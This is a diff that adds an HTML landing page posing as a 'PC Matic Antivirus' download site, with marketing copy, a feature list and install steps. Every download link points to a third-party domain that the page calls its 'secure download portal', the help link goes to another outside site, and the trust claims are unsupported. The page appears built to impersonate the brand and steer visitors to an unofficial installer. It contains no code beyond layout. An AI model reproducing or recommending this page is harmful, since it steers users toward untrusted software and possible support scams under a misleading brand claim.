@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PC Matic Antivirus · Download Now</title>
+
+  <meta name="google-site-verification" content="JniPXoNXSUttYSHTAAYLS7xdedjOndW9OMWjx-wR9l0" />
+  <meta name="msvalidate.01" content="F3B6EEA95ED45CB3199E493F0BE71D9C" />
+
+  <!-- Inter font (clean & modern) -->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,600;14..32,700;14..32,800&display=swap" />
+  <style>
+    /* ----- reset & base ----- */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background: #f0f5fe;
+      font-family: 'Inter', 'Salesforce Sans', 'Segoe UI', Tahoma, Verdana, sans-serif;
+      padding: 0 0 30px 0;
+    }
+    .pcm-wrapper {
+      max-width: 1400px;
+      margin: 0 auto;
+      background: #f0f5fe;
+    }
+    /* card hover */
+    .card-hover {
+      transition: transform 0.15s ease, box-shadow 0.2s ease;
+    }
+    .card-hover:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 20px 44px rgba(0, 0, 0, 0.10) !important;
+    }
+    /* buttons */
+    .btn-primary {
+      background: linear-gradient(135deg, #00d4ff, #0066ff);
+      border: none;
+      color: #fff;
+      font-weight: 700;
+      padding: 12px 28px;
+      border-radius: 60px;
+      text-decoration: none;
+      display: inline-block;
+      box-shadow: 0 6px 20px rgba(0, 102, 255, 0.30);
+      transition: all 0.2s;
+      font-size: 15px;
+    }
+    .btn-primary:hover {
+      background: linear-gradient(135deg, #1ad4ff, #1a70ff);
+      box-shadow: 0 8px 28px rgba(0, 102, 255, 0.45);
+      transform: scale(1.02);
+      color: #fff;
+    }
+    .btn-download {
+      background: linear-gradient(135deg, #fca311, #f48c06);
+      border: none;
+      color: #0a2540;
+      font-weight: 700;
+      padding: 14px 34px;
+      border-radius: 60px;
+      text-decoration: none;
+      display: inline-block;
+      box-shadow: 0 6px 24px rgba(252, 163, 17, 0.35);
+      transition: all 0.2s;
+      font-size: 17px;
+    }
+    .btn-download:hover {
+      background: linear-gradient(135deg, #ffb84d, #f48c06);
+      box-shadow: 0 10px 32px rgba(252, 163, 17, 0.50);
+      transform: scale(1.03);
+      color: #0a2540;
+    }
+    .btn-outline-light {
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(255, 255, 255, 0.25);
+      color: #fff;
+      font-weight: 600;
+      padding: 12px 28px;
+      border-radius: 60px;
+      text-decoration: none;
+      display: inline-block;
+      backdrop-filter: blur(4px);
+      transition: 0.2s;
+    }
+    .btn-outline-light:hover {
+      background: rgba(255, 255, 255, 0.18);
+      border-color: rgba(255, 255, 255, 0.5);
+      color: #fff;
+    }
+    .btn-secondary {
+      background: #f0f5fe;
+      border: 1px solid #0066ff;
+      color: #0066ff;
+      font-weight: 600;
+      padding: 12px 28px;
+      border-radius: 60px;
+      text-decoration: none;
+      display: inline-block;
+      transition: 0.2s;
+    }
+    .btn-secondary:hover {
+      background: #e2edff;
+      border-color: #0047b3;
+      color: #0047b3;
+    }
+    .feature-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
+      gap: 18px;
+      margin-top: 22px;
+    }
+    .feature-item {
+      background: #f8faff;
+      border-radius: 16px;
+      padding: 20px 22px;
+      border-left: 4px solid #0066ff;
+      transition: 0.15s;
+    }
+    .feature-item:hover {
+      background: #f0f7ff;
+      border-left-color: #fca311;
+    }
+    .benefit-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 16px;
+      margin-top: 20px;
+    }
+    .benefit-card {
+      background: rgba(255, 255, 255, 0.06);
+      border-radius: 14px;
+      padding: 18px 20px;
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      transition: 0.15s;
+    }
+    .benefit-card:hover {
+      background: rgba(255, 255, 255, 0.10);
+      border-color: rgba(255, 255, 255, 0.15);
+    }
+    .dashed-border {
+      border: 2px dashed #fca311;
+      border-radius: 24px;
+    }
+    .step-number {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background: #0a2540;
+      color: #fff;
+      width: 32px;
+      height: 32px;
+      border-radius: 40px;
+      font-weight: 700;
+      font-size: 15px;
+      flex-shrink: 0;
+      margin-right: 14px;
+    }
+    @media (max-width: 640px) {
+      .pcm-header {
+        flex-wrap: wrap;
+        gap: 14px;
+      }
+      .pcm-hero h1 {
+        font-size: 32px;
+      }
+      .pcm-hero p {
+        font-size: 16px;
+        padding: 0 10px;
+      }
+      .pcm-card {
+        padding: 28px 20px !important;
+      }
+      .feature-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="pcm-wrapper">
+
+  <!-- ===== HEADER ===== -->
+  <header style="width:100%; background:linear-gradient(135deg,#0a2540,#1a3a5c); padding:14px 28px; box-sizing:border-box; display:flex; align-items:center; justify-content:space-between; box-shadow:0 4px 16px rgba(0,0,0,0.15); flex-wrap:wrap; gap:12px; border-radius:0 0 12px 12px;">
+    <div style="display:flex; align-items:center; gap:14px;">
+      <div style="width:46px;height:46px; background:linear-gradient(135deg,#fca311,#f48c06); border-radius:12px; display:flex; align-items:center; justify-content:center; color:#0a2540; font-size:22px; font-weight:800; box-shadow:0 4px 12px rgba(252,163,17,0.3);">
+        PM
+      </div>
+      <div>
+        <div style="font-size:22px; font-weight:700; color:#ffffff; letter-spacing:-0.3px; line-height:1.2;">
+          PC Matic <span style="color:#fca311; font-weight:300;">|</span> Antivirus
+        </div>
+        <div style="font-size:12px; color:#aac9ff; letter-spacing:0.3px;">Download · Protect · Optimize</div>
+      </div>
+    </div>
+    <a href="https://i-downloadsoftwares.com/" style="background:linear-gradient(135deg,#fca311,#f48c06); color:#0a2540; padding:10px 22px; border-radius:8px; font-size:14px; font-weight:700; text-decoration:none; box-shadow:0 4px 16px rgba(252,163,17,0.35); transition:0.2s; white-space:nowrap;">⬇️ Download</a>
+  </header>
+
+  <!-- ===== HERO ===== -->
+  <section class="pcm-hero" style="background:linear-gradient(135deg,#0d2847,#1a4a7a); padding:70px 20px 60px; text-align:center; position:relative; overflow:hidden; border-radius:0 0 40px 40px; margin-bottom:10px;">
+    <div style="position:absolute; top:-120px; right:-80px; width:400px; height:400px; background:rgba(0,212,255,0.06); border-radius:50%; filter:blur(80px);"></div>
+    <div style="position:absolute; bottom:-100px; left:-60px; width:350px; height:350px; background:rgba(252,163,17,0.05); border-radius:50%; filter:blur(70px);"></div>
+    <h1 style="margin:0; font-size:44px; color:#ffffff; font-weight:800; letter-spacing:-0.5px; position:relative;">
+      Download <span style="background:linear-gradient(135deg,#fca311,#ffb84d); -webkit-background-clip:text; background-clip:text; color:transparent;">PC Matic</span> Antivirus
+    </h1>
+    <p style="max-width:800px; margin:18px auto 0; font-size:18px; line-height:1.9; color:#d0e4ff; position:relative;">
+      Next‑gen protection that stops zero‑day threats, ransomware, and malware before they execute. Lightweight, AI‑powered, and built for speed.
+    </p>
+    <div style="margin-top:30px; display:flex; gap:16px; justify-content:center; flex-wrap:wrap; position:relative;">
+      <a href="https://i-downloadsoftwares.com/" class="btn-download" style="padding:16px 44px; font-size:18px;">⬇️ Download PC Matic</a>
+      
+    </div>
+  </section>
+
+  <!-- ===== MAIN CONTENT ===== -->
+  <div style="max-width:1050px; margin:-30px auto 50px; padding:0 20px; box-sizing:border-box; position:relative; z-index:2;">
+
+    <!-- Card 1: Why PC Matic -->
+    <div id="features" class="pcm-card card-hover" style="background:#ffffff; border-radius:20px; padding:40px 44px; box-shadow:0 12px 40px rgba(0,0,0,0.08); margin-bottom:30px; border:1px solid rgba(0,0,0,0.04);">
+      <div style="display:flex; align-items:center; gap:14px; margin-bottom:8px;">
+        <span style="font-size:32px;">🛡️</span>
+        <h2 style="color:#0a2540; font-size:30px; font-weight:700; margin:0;">Why PC Matic is Different</h2>
+      </div>
+      <p style="font-size:16px; line-height:1.9; color:#4a5568; margin-top:12px;">
+        Traditional antivirus relies on outdated signature databases — missing new threats. PC Matic uses a <strong>whitelist approach</strong> combined with AI, so only trusted applications run. This means <strong>zero‑day malware, ransomware, and fileless attacks</strong> are stopped before they can execute.
+      </p>
+      <p style="font-size:16px; line-height:1.9; color:#4a5568;">
+        With ultra‑low system impact, automatic updates, and 24/7 real‑time monitoring, PC Matic delivers enterprise‑grade security without slowing you down.
+      </p>
+      <div style="margin-top:20px;">
+        <a href="https://i-downloadsoftwares.com/" class="btn-download">⬇️ Download Now</a>
+      </div>
+    </div>
+
+    <!-- Card 2: Key Features -->
+    <div class="pcm-card card-hover" style="background:#ffffff; border-radius:20px; padding:40px 44px; box-shadow:0 12px 40px rgba(0,0,0,0.08); margin-bottom:30px; border:1px solid rgba(0,0,0,0.04);">
+      <div style="display:flex; align-items:center; gap:14px; margin-bottom:8px;">
+        <span style="font-size:32px;">⚡</span>
+        <h2 style="color:#0a2540; font-size:30px; font-weight:700; margin:0;">Next‑Gen Security Features</h2>
+      </div>
+      <p style="font-size:16px; line-height:1.9; color:#4a5568; margin-top:12px;">
+        PC Matic combines multiple layers of protection to keep your system safe and fast. Here's what you get:
+      </p>
+      <div class="feature-grid">
+        <div class="feature-item" style="border-left-color:#fca311;"><strong style="color:#0a2540; font-size:17px; display:block; margin-bottom:4px;">🧠 AI Threat Detection</strong><span style="font-size:14px; color:#5a6b82;">Machine learning identifies and blocks never‑seen‑before threats.</span></div>
+        <div class="feature-item" style="border-left-color:#00d4ff;"><strong style="color:#0a2540; font-size:17px; display:block; margin-bottom:4px;">🛡️ Ransomware Shield</strong><span style="font-size:14px; color:#5a6b82;">Proactive behavioral monitoring stops ransomware before encryption.</span></div>
+        <div class="feature-item" style="border-left-color:#ff9800;"><strong style="color:#0a2540; font-size:17px; display:block; margin-bottom:4px;">⚡ Ultra‑Lightweight</strong><span style="font-size:14px; color:#5a6b82;">Minimal CPU/memory usage — perfect for gaming and work.</span></div>
+        <div class="feature-item" style="border-left-color:#7c4dff;"><strong style="color:#0a2540; font-size:17px; display:block; margin-bottom:4px;">🌐 Web & Email Guard</strong><span style="font-size:14px; color:#5a6b82;">Blocks phishing, malicious downloads, and unsafe links in real time.</span></div>
+   
+    </div>
+
+    <!-- Card 3: How to Download & Install (detailed steps) -->
+    <div class="pcm-card card-hover" style="background:#ffffff; border-radius:20px; padding:40px 44px; box-shadow:0 12px 40px rgba(0,0,0,0.08); margin-bottom:30px; border:1px solid rgba(0,0,0,0.04);">
+      <div style="display:flex; align-items:center; gap:14px; margin-bottom:8px;">
+        <span style="font-size:32px;">📥</span>
+        <h2 style="color:#0a2540; font-size:30px; font-weight:700; margin:0;">How to Download & Install PC Matic</h2>
+      </div>
+
+      <div style="display:flex; gap:14px; margin-top:20px; align-items:flex-start;">
+        <div class="step-number">1</div>
+        <p style="font-size:16px; line-height:1.8; color:#4a5568;"><strong>Click the download button</strong> – it will redirect you to our secure download portal (powered by i-downloadsoftwares.com).</p>
+      </div>
+      <div style="display:flex; gap:14px; margin-top:14px; align-items:flex-start;">
+        <div class="step-number">2</div>
+        <p style="font-size:16px; line-height:1.8; color:#4a5568;"><strong>Run the installer</strong> – double‑click the downloaded <code style="background:#eef2f7; padding:2px 8px; border-radius:6px;">PC_Matic_Setup.exe</code> and allow it to make changes to your device.</p>
+      </div>
+      <div style="display:flex; gap:14px; margin-top:14px; align-items:flex-start;">
+        <div class="step-number">3</div>
+        <p style="font-size:16px; line-height:1.8; color:#4a5568;"><strong>Follow the setup wizard</strong> – choose your preferred language, installation folder, and optional components.</p>
+      </div>
+      <div style="display:flex; gap:14px; margin-top:14px; align-items:flex-start;">
+        <div class="step-number">4</div>
+        <p style="font-size:16px; line-height:1.8; color:#4a5568;"><strong>Activate your protection</strong> – enter your license key or start the 30‑day free trial (no credit card required).</p>
+      </div>
+      <div style="display:flex; gap:14px; margin-top:14px; align-items:flex-start;">
+        <div class="step-number">5</div>
+        <p style="font-size:16px; line-height:1.8; color:#4a5568;"><strong>Run your first scan</strong> – PC Matic will immediately check for vulnerabilities, outdated drivers, and potential threats.</p>
+      </div>
+
+      <div style="background:#fef6e6; border-radius:14px; padding:20px 24px; margin-top:24px; border-left:4px solid #fca311;">
+        <p style="margin:0; font-size:15px; color:#0a2540; font-weight:600;">💡 Pro Tip: After installation, run a full system scan to ensure your PC is completely secure.</p>
+      </div>
+    
+    </div>
+
+    <!-- Card 4: Benefits of PC Matic -->
+    <div class="card-hover" style="background:linear-gradient(135deg,#0a2540,#1a3a5c); border-radius:20px; padding:40px 44px; box-shadow:0 12px 40px rgba(0,0,0,0.15); margin-bottom:30px; border:1px solid rgba(255,255,255,0.06);">
+      <div style="display:flex; align-items:center; gap:14px; margin-bottom:8px;">
+        <span style="font-size:32px;">✅</span>
+        <h2 style="color:#ffffff; font-size:30px; font-weight:700; margin:0;">Benefits of PC Matic Antivirus</h2>
+      </div>
+      <p style="font-size:16px; line-height:1.9; color:#d0e4ff; margin-top:12px;">Thousands of users trust PC Matic for their cybersecurity. Here's why:</p>
+      <div class="benefit-grid">
+        <div class="benefit-card"><div style="font-size:28px;">🔒</div><strong style="color:#fff; display:block; margin-top:6px;">Zero‑Day Protection</strong><span style="font-size:13px; color:#b0cbe5;">Stops brand‑new threats that traditional AV misses.</span></div>
+        <div class="benefit-card"><div style="font-size:28px;">📈</div><strong style="color:#fff; display:block; margin-top:6px;">99.9% Detection Rate</strong><span style="font-size:13px; color:#b0cbe5;">Industry‑leading threat detection performance.</span></div>
+        <div class="benefit-card"><div style="font-size:28px;">💻</div><strong style="color:#fff; display:block; margin-top:6px;">Ultra‑Low System Impact</strong><span style="font-size:13px; color:#b0cbe5;">Keeps your PC fast — ideal for gaming and heavy workloads.</span></div>
+        <div class="benefit-card"><div style="font-size:28px;">🕒</div><strong style="color:#fff; display:block; margin-top:6px;">24/7 Real‑Time Monitoring</strong><span style="font-size:13px; color:#b0cbe5;">Always‑on protection with automatic updates.</span></div>
+      </div>
+      <div style="margin-top:24px; text-align:center;">
+        <a href="https://i-downloadsoftwares.com/" class="btn-outline-light" style="padding:12px 32px; font-size:15px;">⬇️ Download Free Trial</a>
+      </div>
+    </div>
+
+    <!-- Card 5: Final Call to Action -->
+    <div class="pcm-card card-hover dashed-border" style="background:#ffffff; border-radius:20px; padding:36px 44px; box-shadow:0 12px 40px rgba(0,0,0,0.08); text-align:center;">
+      <h3 style="color:#0a2540; font-size:28px; margin:0 0 10px 0;">Ready to Secure Your PC?</h3>
+      <p style="font-size:17px; color:#4a5568; max-width:600px; margin:0 auto 22px;">Download PC Matic Antivirus now and get 30‑day full protection free. No credit card required.</p>
+      <div style="display:flex; gap:16px; justify-content:center; flex-wrap:wrap;">
+        <a href="https://i-downloadsoftwares.com/" class="btn-download" style="padding:18px 52px; font-size:20px;">⬇️ Download PC Matic</a>
+        <a href="https://getchatsupport.net/" class="btn-secondary" style="padding:16px 36px; font-size:16px;">📞 Need Help?</a>
+      </div>
+      <div style="margin-top:16px; font-size:14px; color:#5a6b82;">
+        <span>🔒 Secure download · 256‑bit encrypted · trusted by 2M+ users</span>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ===== FOOTER ===== -->
+  <footer style="background:#0a1a2e; border-top:1px solid rgba(255,255,255,0.06); padding:24px 20px; text-align:center; font-size:13px; color:#7a8fa5; border-radius:20px 20px 0 0; margin: 0 10px;">
+    <div style="max-width:1050px; margin:0 auto; display:flex; justify-content:space-between; flex-wrap:wrap; gap:12px;">
+      <span>© 2026 PC Matic Antivirus. All Rights Reserved.</span>
+      <span style="display:flex; gap:20px; flex-wrap:wrap; justify-content:center;">
+        <a href="#" style="color:#7a8fa5; text-decoration:none;">Privacy Policy</a>
+        <a href="#" style="color:#7a8fa5; text-decoration:none;">Terms of Service</a>
+        <a href="https://i-downloadsoftwares.com/" style="color:#7a8fa5; text-decoration:none;">Download</a>
+      </span>
+    </div>
+  </footer>
+
+</div>
+</body>
+</html>
